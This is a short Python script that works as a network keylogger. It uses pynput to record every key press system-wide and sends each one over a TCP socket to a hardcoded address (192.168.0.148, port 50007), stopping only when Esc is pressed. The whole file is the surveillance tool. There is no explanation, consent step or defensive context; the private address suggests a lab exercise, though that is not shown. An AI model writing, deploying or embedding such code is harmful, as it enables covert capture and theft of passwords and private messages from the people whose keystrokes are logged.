from socket import *
from pynput import keyboard

serverHost = "192.168.0.148"
serverPort = 50007
sockobj = socket(AF_INET, SOCK_STREAM)
sockobj.connect((serverHost, serverPort))


def on_press(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

    msg = str(key)

    sockobj.send(msg.encode())


with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()


sockobj.close()
